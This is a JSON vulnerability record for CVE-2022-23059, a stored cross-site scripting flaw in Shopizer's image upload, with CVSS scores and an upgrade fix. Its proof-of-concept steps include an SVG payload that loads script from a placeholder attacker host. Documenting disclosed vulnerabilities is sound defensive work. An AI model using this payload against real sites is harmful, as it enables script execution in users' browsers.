```
{
  "cveId": "CVE-2022-23059",
  "date": "March 29, 2022",
  "vulnerability": {
    "rootCause": "The vulnerability is due to a lack of proper sanitization of SVG files uploaded through the \"Manage Images\" tab.",
    "weaknesses": [
      "Stored Cross-Site Scripting (XSS)"
    ],
    "impact": "An attacker can execute arbitrary JavaScript code within the context of the victim's browser.",
    "attackVectors": [
      "The attack vector is through a network by uploading a malicious SVG file with a script tag referencing an external malicious JavaScript file."
    ],
    "attackerCapabilities": {
      "requiredPrivileges": "High privileges are required as the attacker needs to access the admin interface, and have the ability to upload images.",
        "userInteraction": "User interaction is required to access the image in a new tab which triggers the external javascript"
    },
        "pocDetails": [
            "1. Access “/admin/login.html” URL and login using the credentials “testuser:password”.",
            "2. Navigate to the “Manage Images” tab from “Manage content” and upload a SVG file with this code: <svg><script type=”text/javascript” xlink:href=”http://attacker\_ip:port/xss.js”></script></svg>",
            "3. Run a simple HTTP server with content in “xss.js” file as “alert(“XSS”);”.",
            "4. The uploaded SVG file can be found under “Manage images” and to access it “open image in new tab”.",
            "5. An external JS file has been loaded into the application and triggered an XSS."
          ],
    "affectedEnvironments": "Shopizer versions v2.0.2 through v2.17.0",
    "prevention": "Upgrade to Shopizer version 3.0.0"
  },
  "cvssv3": {
     "baseScore": "4.8",
        "attackVector": "Network",
        "attackComplexity": "Low",
        "privilegesRequired": "High",
        "userInteraction": "Required",
        "scope": "Changed",
        "confidentiality": "Low",
        "integrity": "Low",
        "availability": "None"
  },
   "cvssv2": {
      "baseScore": "3.5",
        "accessVector": "Network",
        "accessComplexity": "Medium",
        "authentication": "Single",
        "confidentiality": "None",
        "integrity": "Partial",
         "availability": "None"
  }
}
```